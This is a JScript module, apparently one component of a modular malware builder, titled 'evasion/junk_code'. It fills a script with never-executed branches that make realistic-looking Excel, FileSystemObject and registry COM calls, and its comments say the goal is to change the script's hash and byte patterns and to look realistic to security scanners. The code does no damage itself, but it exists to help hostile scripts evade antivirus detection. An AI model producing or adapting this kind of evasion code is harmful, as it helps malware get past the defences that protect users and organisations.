// chunk: evasion/junk_code
// depends: (none)
// provides: junk_init
// format: jscript
// note: Injects dead code branches with realistic COM object calls and
//       Windows API patterns. Changes script hash and byte patterns without
//       affecting execution. The junk functions are called but their results
//       are discarded, adding realistic-looking COM activity.

function junk_init() {
    var r = Math.random();
    if (r > 2) {
        /* Dead branch — never executes but looks realistic to scanners */
        try {
            var xl = new ActiveXObject("Excel.Application");
            xl.Visible = false;
            var wb = xl.Workbooks.Add();
            wb.Sheets(1).Cells(1,1).Value = "Report " + new Date().toISOString();
            wb.SaveAs("C:\\Users\\Public\\report.xlsx");
            wb.Close();
            xl.Quit();
        } catch(e) {}
    }

    var x = (Math.floor(Math.random() * 100) + 1);
    var y = x * x + 2 * x + 1;
    var z = Math.sqrt(y);

    if (z > 1000000) {
        try {
            var fso = new ActiveXObject("Scripting.FileSystemObject");
            var drives = new Enumerator(fso.Drives);
            var total = 0;
            while (!drives.atEnd()) {
                if (drives.item().IsReady) total += drives.item().TotalSize;
                drives.moveNext();
            }
        } catch(e) {}
    }

    /* Legitimate-looking registry check that always succeeds */
    try {
        var sh = new ActiveXObject("WScript.Shell");
        var ver = sh.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductName");
        if (ver.indexOf("ZZZZZ_NEVER_MATCH") >= 0) {
            sh.Run("calc.exe", 0, false);
        }
    } catch(e) {}
}
